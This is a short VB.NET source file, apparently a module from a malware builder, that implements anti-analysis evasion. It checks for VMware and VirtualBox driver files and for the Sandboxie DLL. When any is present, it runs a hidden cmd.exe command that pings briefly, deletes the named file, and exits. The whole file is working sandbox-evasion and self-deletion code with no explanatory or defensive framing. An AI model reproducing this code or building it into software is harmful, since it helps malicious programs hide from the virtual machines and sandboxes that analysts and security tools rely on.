Namespace Antis
    Public Class AntiVM
        Public Sub ST(ByVal File As String)
            Try
                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\" & "vmGuestLib.dll") Then D(File)
            Catch : End Try
            Try
                If IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\" & "vboxmrxnp.dll") Then D(File)
            Catch : End Try
            Try
                If LoadLibrary("SbieDll.dll") = True Then D(File)
            Catch : End Try
        End Sub

        <Runtime.InteropServices.DllImport("kernel32.dll")>
        Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
        End Function
        Public Sub D(ByVal F As String)
            Try
                Shell("cmd.exe /c ping 0 -n 2 & del " & """" & F & """", AppWinStyle.Hide, False, -1)
                Environment.Exit(0)
            Catch : End Try
        End Sub
    End Class
End Namespace